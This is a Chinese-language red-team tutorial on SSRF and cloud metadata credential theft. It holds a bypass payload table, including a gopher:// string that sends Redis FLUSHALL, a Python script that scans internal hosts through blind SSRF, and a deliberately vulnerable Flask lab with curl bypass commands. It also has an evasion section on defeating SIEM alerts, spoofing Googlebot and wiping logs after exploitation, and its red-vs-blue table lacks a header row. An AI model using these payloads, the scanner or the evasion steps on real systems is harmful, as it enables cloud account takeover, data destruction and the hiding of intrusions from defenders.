# R11.1 伺服器端請求偽造 (SSRF) 與雲端中繼資料 (IMDS) 突防實戰 (Server-Side Request Forgery & IMDS Exploitation)

---

## 🎯 作戰任務破題 (Tactical Objective & Mental Workflow)

在企業實戰滲透與紅隊演練中，外部邊界通常防禦森嚴：邊界部屬了次世代防火牆 (NGFW)、雲端 WAF 以及 CDN 節點，所有外部對 Web 服務的 SQL 注入、跨站腳本 (XSS) 或檔案上傳皆被行為模型阻斷。此時，**攻擊面必須從「外部直接攻入」轉向「劫持信任關係」**。

現代企業架構中，Web 伺服器並非獨立孤島，而是擁有高度內網存取特權的「可信任代理人」——它們被允許存取後端 API 叢集、未對外開放的快取資料庫 (Redis/Memcached)、微服務管理後台，以及雲端供應商特有的「實例中繼資料服務」(Instance Metadata Service, IMDS)。**伺服器端請求偽造 (Server-Side Request Forgery, SSRF)** 的本質，正是強迫這個擁有合法信任身分的伺服器，充當紅隊在目標隔離網路中的「代理人 (Proxy)」，一舉穿透 VPC 邊界。

```
[攻擊者終端] ── 1. 外部注入 SSRF Payload ──► [企業邊界 Web 伺服器 (具備 VPC/IAM 信任)]
                                                    │
                 ┌──────────────────────────────────┴──────────────────────────────────┐
                 │ 伺服器解析 URL 並發起第二跳請求 (The Server-Side Jump)            │
                 ▼                                                                     ▼
    [雲端中繼資料服務 (IMDS)]                                           [內網未授權基礎設施]
       http://169.254.169.254/                                              http://10.0.0.5:6379 (Redis)
                 │                                                                     │
                 ▼ 2. 榨取臨時憑證 (STS Token)                                        ▼ 3. Gopher 走私打擊
  {AccessKeyId, SecretKey, Token}                                      CONFIG SET dbfilename / RCE
                 │                                                                     │
                 └──────────────────────────────────┬──────────────────────────────────┘
                                                    ▼
[攻擊者控制台] ◄── 4. 戰果回傳：接管雲端帳號全域資產 / 內網主機 RCE 權限 ────────┘
```

### 作戰痛點與決策分支
- **痛點場景**：目標系統存在自訂圖片載入、WebHook 回呼、PDF 報表產出或 URL 預覽功能，但後端設有黑名單檢驗（如過濾 `127.0.0.1`、`localhost`、`169.254`）。
- **決策心流**：
  1. **確認回顯狀態**：有完整回顯（Direct SSRF）➔ 直接竊取 IMDS 敏感資訊或打擊 HTTP 服務；無回顯（Blind SSRF）➔ 部署帶外通道 (OOB / DNSlog) 驗證聯通性與探測內網埠號。
  2. **突破白名單/黑名單**：檢測 URL 解析器歧異（RFC 3986 瑕疵）、DNS 重新綁定 (DNS Rebinding) 與十進位/十六進位 IP 變形。
  3. **協定升級打擊**：若底層函式庫支援重導向或 `gopher://`，立即升級為內網服務遠端代碼執行 (RCE)。

## 🔬 第一動：底層協定/漏洞機制全景解剖 (Mechanics & Physical Structs)

### 1. 雲端中繼資料服務 (IMDS) 物理架構缺陷
雲端虛擬機（AWS EC2、Azure VM、GCP GCE）透過本機連線導向非繞送位址（Link-Local Address）`169.254.169.254` 提供實例元數據。該位址位於本機軟體網路介面，不需要經過外部路由器，但預設情況下**缺乏強身分驗證**：

```
+-----------------------------------------------------------------------------------------------+
| 雲端 IMDS 通訊封包與認證機制解剖                                                               |
|                                                                                               |
| 1. IMDSv1 (易受無狀態請求穿透)                                                                 |
|    - 攻擊者請求：GET /latest/meta-data/iam/security-credentials/{Role-Name} HTTP/1.1          |
|    - 關鍵特性：完全無狀態 (Stateless)。任何由應用程式發出的簡單 GET 請求即可直接帶出憑證。    |
|    - 封包特徵：無特殊要求標頭，只要封包抵達 169.254.169.254:80 即視為合法宿主發起。          |
|                                                                                               |
| 2. IMDSv2 (會話導向防護與 Hop Limit 限制)                                                    |
|    - 第一跳 (Token 索取)：PUT /latest/api/token (需帶 X-aws-ec2-metadata-token-ttl-seconds)   |
|    - 第二跳 (憑證取得)：GET /latest/meta-data/... (必須攜帶取得之 X-aws-ec2-metadata-token)   |
|    - 物理屏障：多數 SSRF 無法自訂 HTTP 標頭或方法為 PUT；且封包 Hop Limit = 1，代理即拋棄。  |
|    - 紅隊突破破綻：若應用程式存在反向代理 (Reverse Proxy) 錯誤配置或任意標頭轉發，仍有失守可能。|
+-----------------------------------------------------------------------------------------------+
```

### 2. URL 解析器標準歧異 (RFC 3986 vs. WHATWG Parser Differentials)
應用程式在進行防禦校驗時，通常使用高階語言封裝的 URL 驗證模組，但發起實際網路連線時，卻是由底層網路庫（如 `libcurl`、`urllib` 或系統 socket）負責。不同的解析器對 RFC 3986 的解讀差異造成了檢查繞過：

```text
典型解析器歧異結構 (Parser Differential):
  http://expected-safe.com@169.254.169.254/
  [驗證模組視角 (Node.js/Python 簡易庫)] ──► Hostname = "expected-safe.com" (白名單通過！)
  [連線函式庫視角 (libcurl / 底層 libc)] ──► Hostname = "169.254.169.254", User = "expected-safe.com"
```

### 3. DNS 重新綁定 (DNS Rebinding: TOCTOU 物理時差)
當後端應用程式實施「檢查 IP ➔ 通過後再連線」的防禦邏輯時，會觸發**檢查時間點與使用時間點 (TOCTOU)** 的時間差競爭條件：

```
時間軸 (Timeline) ─────────────────────────────────────────────────────────────►
  [T1] 驗證階段：
       應用程式調用 gethostbyname("attacker-domain.com")
       DNS 回應 (TTL=0)：1.2.3.4 (外部合法公開 IP)
       驗證邏輯：1.2.3.4 不是內網 IP ➔ 通過檢查！
  [T2] 連線階段：
       應用程式調用 socket.connect("attacker-domain.com")
       因 TTL=0，系統快取失效，再次發起 DNS 查詢
       攻擊者 DNS 伺服器切換回應：169.254.169.254 (或 127.0.0.1)
       物理連線直達內部敏感位址！
```

## ⚡ 第二動：武器化與突防打擊 (Weaponization & Exploitation Vector)

### 1. 字典級 IP 與協定混淆變體速查表

| 繞過目標情境 | 核心 Payload 構造與編碼變體 | 突防原理說明 |
| :--- | :--- | :--- |
| **繞過 `127.0.0.1` 黑名單** | `http://127.1`<br>`http://0.0.0.0`<br>`http://0/` | Linux/BSD socket 實作會自動補齊末段零；`0.0.0.0` 綁定全介面通常導向 localhost。 |
| **進位制編碼偽裝** | `http://0177.0.0.1` (八進位)<br>`http://0x7f.0.0.1` (十六進位)<br>`http://2130706433` (十進位整數) | 底層 `inet_aton()` 自動解析八進位與十六進位，輕易繞過單純的字串比對或正則。 |
| **IPv6 封裝閉合** | `http://[::1]`<br>`http://[::ffff:127.0.0.1]`<br>`http://[0:0:0:0:0:ffff:169.254.169.254]` | 利用 IPv6 雙冒號省略表示法或 IPv4-mapped IPv6 表示法穿透單純比對 IPv4 的檢驗器。 |
| **網域名稱與 CNAME 代理** | `http://127.0.0.1.nip.io`<br>`http://spoofed.169.254.169.254.nip.io` | 利用公共 DNS 解析服務，將子網域名稱直接解析為指向的敏感 IP。 |
| **URL 認證語意欺騙** | `http://target-corp.com@169.254.169.254/`<br>`http://169.254.169.254#@target-corp.com` | 利用 RFC 3986 規範中的 `userinfo@host` 欄位與 `#` fragment 混淆主機名稱判讀。 |
| **罕見協定注入 (Protocols)** | `gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall...`<br>`dict://127.0.0.1:6379/info` | 利用 `gopher://` 協定自訂任意 TCP 二進位串流，可將 HTTP 請求封裝為 Redis、FastCGI 指令。 |

#### (3) 盲打 SSRF 內網存活探測 (Timing / Response Diff Automation)
```python
#!/usr/bin/env python3
# Blind SSRF 內網網段探針腳本 (基於連線逾時與狀態碼差異)
import requests
import time

TARGET_URL = "http://target-app.com/api/fetch_avatar"
INTERNAL_NET = "10.0.1."
COMMON_PORTS = [80, 443, 6379, 8080, 9200]

for host in range(1, 20):
    for port in COMMON_PORTS:
        probe_ip = f"{INTERNAL_NET}{host}"
        probe_url = f"http://{probe_ip}:{port}/"
        payload = {"avatar_url": probe_url}
        
        start = time.time()
        try:
            r = requests.post(TARGET_URL, json=payload, timeout=3.0)
            elapsed = time.time() - start
            # 若內網連接迅速拒絕 (RST) 通常 < 0.2s；連線成功且回傳 HTTP 回顯；連線丟包 (DROP) 則觸發逾時
            if r.status_code == 200 or elapsed < 0.5:
                print(f"[+] 發現內網存活資產: {probe_ip}:{port} (狀態: {r.status_code}, 耗時: {elapsed:.2f}s)")
        except requests.exceptions.Timeout:
            pass  # 被防火牆 DROP，主機未開放或不存活
        except Exception as e:
            pass
```

## 🥷 第三動：隱匿作戰與反鑑識規避 (Evasion & Anti-Forensics Operational Cheatsheet)

### 1. 帶外信道隱匿 (Out-of-Band OOB Stealth)
在面對盲打 SSRF 時，絕不能直接在目標發送高頻的外部 WebHook 請求。
- **DNS 帶外通道偽裝**：使用自建或受信任的權威 DNS 伺服器，將識別標籤編碼於子網域名稱中（如 `token-01.attacker-c2.com`）。DNS 查詢由企業內部 Local DNS 轉發，外部日誌無法直接看到紅隊的原始 IP。
- **無特徵 User-Agent 偽裝**：若 SSRF 允許自訂或繼承標頭，務必置換底層客戶端預設特徵（如 `python-requests/2.31.0` 或 `curl/7.88.1`），將其偽裝為常規商業爬蟲或 Googlebot：
  `User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)`

### 2. 避免觸發 SOC 頻率與異常行為告警
- **注入 Jitter 抖動延遲**：探測內網資產時，每一次請求間隔加入 3～8 秒的隨機浮動，破壞 SIEM 視窗內的固定頻率關聯規則。
- **分散源位址與雙向協作**：透過分散式節點進行盲打觸發，避免單一來源觸發 WAF 的 IP 封鎖閾值。
- **清除暫存殘餘 (Cleanup)**：如果透過 SSRF 上傳檔案或觸發快取，在完成權限提升後，透過後滲透終端立即抹除產生的臨時圖片與日誌條目。

## ⚔️ 第四動：紅藍攻防對抗矩陣 (Red vs. Blue Confrontation Matrix)

| :--- | :--- | :--- | :--- |
| **探測 `169.254.169.254`** | Web 應用層 Access Log 含特殊 IP；VPC Flow Logs 記錄本機對 Link-Local 發起連線。 | WAF 規則阻斷 `169.254.` 關鍵字；CloudWatch 告警短時間多次存取 IMDS。 | 使用十進位整數 (`http://2852039166/`) 或自訂 DNS 泛解析解析至該位址，完全繞過字串過濾。 |
| **使用 Gopher 走私協定** | 封包出現未加密的協定標頭；Web 請求參數中出現 `gopher://` 與多層 URL 編碼 (`%0d%0a`)。 | Suricata 規則告警非 HTTP 協定出現在 Web 請求參數；阻斷未定義 URL Scheme。 | 尋找目標應用程式的 HTTP 重導向 (302 Redirect) 機制：輸入公開 HTTP URL，由外部重導向至 `gopher://`，繞過前端驗證。 |
| **內網埠號掃描與探測** | 伺服器發出大量跨網段 SYN 封包，出現大量未連線成功之 RST 紀錄 (Sysmon Event ID 3)。 | SIEM 偵測單一 Web 主機在 1 分鐘內對內網發起超過 50 個不同埠號的 TCP 連線。 | 實施「長週期低頻探測 (Low & Slow)」，僅挑選目標高價值資產 (6379, 8080)；不作全網段暴力 Sweep。 |
| **DNS 重新綁定反覆查詢** | DNS 遞迴伺服器日誌顯示同一域名連續查詢，且前後 TTL=0、解析 IP 劇烈跳變。 | 企業 DNS 伺服器啟用「DNS 防重綁定 (DNS Rebinding Protection)」，強制過濾外網解析出私有 IP 的結果。 | 若防護阻斷本機解析，改利用 IPv6 映射、雙 A 記錄機率碰撞，或尋找支援外部 API Callback 的第三方中繼代理。 |

## 🧪 實戰演練環境導引 (Hands-on Range Lab Walkthrough)

本實驗提供極簡、高保真之 SSRF 易受攻擊模擬環境，內置 IP 檢查黑名單邏輯，供紅隊實戰演練繞過與突防。

### 1. 靶場架設 (app.py)
```python
# 脆弱環境程式碼: app.py
from flask import Flask, request, jsonify
import urllib.request
import socket

app = Flask(__name__)

# 簡易黑名單：過濾 127.0.0.1 與 169.254.169.254 字串
BLACKLIST = ["127.0.0.1", "localhost", "169.254.169.254"]

@app.route('/fetch', methods=['GET'])
def fetch_url():
    target = request.args.get('url', '')
    if not target:
        return jsonify({"error": "缺少 url 參數"}), 400
    
    # 脆弱的表面防禦：僅做單純字串比對
    for bad in BLACKLIST:
        if bad in target:
            return jsonify({"status": "blocked", "reason": f"黑名單攔截: {bad}"}), 403
            
    try:
        # 發起第二跳請求
        req = urllib.request.Request(target, headers={'User-Agent': 'Internal-Fetcher/1.0'})
        with urllib.request.urlopen(req, timeout=3) as resp:
            content = resp.read().decode('utf-8', errors='ignore')
            return jsonify({"status": "success", "data": content[:1000]})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
```

### 2. 實戰演練步序
1. **觸發黑名單防線**：
   ```bash
   curl "http://127.0.0.1:8000/fetch?url=http://127.0.0.1/admin"
   # 回顯: {"reason":"黑名單攔截: 127.0.0.1","status":"blocked"}
   ```
2. **使用進位制編碼實施突防**：
   ```bash
   curl "http://127.0.0.1:8000/fetch?url=http://2130706433/"
   # 回顯: 成功繞過黑名單並取得本機服務回顯！
   ```
3. **使用 0.0.0.0 突防**：
   ```bash
   curl "http://127.0.0.1:8000/fetch?url=http://0:8000/"
   # 回顯: 成功調用自己本機 Flask 介面！
   ```

## 🎯 作戰驗收檢查點 (Mastery Checklist)

- [ ] **Q1. 目標後端使用正則表達式過濾了 `^https?://.*\.corp\.internal/` 白名單，且強制檢查開頭，你該如何構造 URL 進行繞過？**  
  *分析思路*：利用 `@` 認證符號構造 `http://corp.internal@169.254.169.254/`，或利用 URL 編碼與特殊字元（如 `#`、`?`）使高階檢查模組認為主機名稱為 `corp.internal`，但底層 libc 真正連線至後方指定位址。

- [ ] **Q2. 為什麼在多數現代雲端環境中，取得 IMDSv2 的 SSRF 攻擊難度遠高於 IMDSv1？其本質上的防禦瓶頸在哪？**  
  *分析思路*：IMDSv2 要求發起 `PUT` 請求換取 Session Token，且要求額外的 TTL Header；多數常見 SSRF 情境（如圖片讀取、WebHook）僅允許發出無自訂標頭的 `GET` 請求。同時，AWS 預設將 IMDSv2 回應的 IP TTL (Hop Limit) 限制為 1，阻止了任何跨 Docker 容器或反向代理跳轉的偷渡。

- [ ] **Q3. 面對無回顯的盲打 SSRF (Blind SSRF)，你如何確定內網某一特定主機上的 6379 (Redis) 埠號是否存在且處於開放狀態？**  
  *分析思路*：比對伺服器回應的**時間差 (Timing Attack)** 與 **HTTP 錯誤狀態碼差異**。若連接封閉埠號，作業系統會立即回應 RST 封包，請求瞬間返回 Connection Refused（耗時極短）；若連接未開放且被防火牆過濾的 IP，會導致 TCP SYN 逾時重試（耗時數秒至十數秒）；若埠號開放且等待輸入，連線建立後因協定不匹配在特定秒數後中斷。

- [ ] **Q4. 當後端採用 `gethostbyname()` 先行驗證解析結果，再調用 `curl_exec()` 發起連線時，如何利用 DNS Rebinding 進行攻擊？需要滿足什麼條件？**  
  *分析思路*：攻擊者需掌控權威 DNS 伺服器，將域名的 DNS TTL 設為 0。第一次查詢回傳公開無害 IP（使驗證模組放行），在微秒級的時差後發起第二次網路連線時，DNS 伺服器動態切換回傳 `127.0.0.1` 或 `169.254.169.254`。條件為目標解析快取必須遵守 TTL 規範，且底層連線未快取第一次的解析結果。

- [ ] **Q5. 為什麼使用 `gopher://` 協定能達成遠端代碼執行 (RCE)，而傳統的 `http://` 協定打擊內網 Redis 往往失敗？**  
  *分析思路*：`http://` 協定強制在連線初始帶有 `GET / HTTP/1.1` 及大量不可控的 HTTP Headers，而 Redis 是文字行協定 (RESP)，遇到非預期指令會直接報錯並斷開連接；`gopher://` 允許攻擊者在 URL 後完全自訂二進位與字元內容，精準控制每行換行符 (`\r\n`)，完美擬態為 Redis 客戶端的原生協定指令。
